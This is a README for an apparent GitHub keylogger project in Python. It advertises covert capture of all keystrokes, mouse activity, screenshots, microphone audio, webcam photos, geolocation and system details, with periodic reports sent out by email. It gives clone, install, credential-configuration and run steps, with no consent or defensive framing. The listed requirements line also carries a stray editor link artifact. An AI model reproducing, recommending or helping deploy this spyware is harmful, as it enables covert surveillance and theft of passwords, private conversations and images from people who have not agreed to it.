# Keylogger Project

This project is a Python-based keylogger that captures keyboard inputs, mouse activity, screenshots, microphone recordings, webcam photos, and geolocation data. It also sends periodic reports via email.

## Features

- **Keyboard Logging**: Captures all key presses.
- **Mouse Activity Tracking**: Logs mouse movements, clicks, and scrolls.
- **System Information**: Captures system details such as hostname, IP address, processor, and OS version.
- **Screenshot Capture**: Takes screenshots of the user's screen.
- **Microphone Recording**: Records audio from the microphone.
- **Webcam Photo Capture**: Captures photos using the webcam.
- **Geolocation Tracking**: Tracks the user's location using IP-based geolocation.
- **Email Reporting**: Sends periodic reports via email.

## Requirements

The project requires the following Python libraries:

- `pynput==1.7.3`
- `pyscreenshot`
- `Pillow`
- `sounddevice`
- `opencv-python`
- `geocoder`

Install the dependencies using:

```bash
pip install -r [requirements.txt](http://_vscodecontentref_/0)

git clone https://github.com/PankajAhirrao/keylogger.git
cd keylogger

EMAIL_ADDRESS = "your_email@example.com"
EMAIL_PASSWORD = "your_password"

python keylogger.py
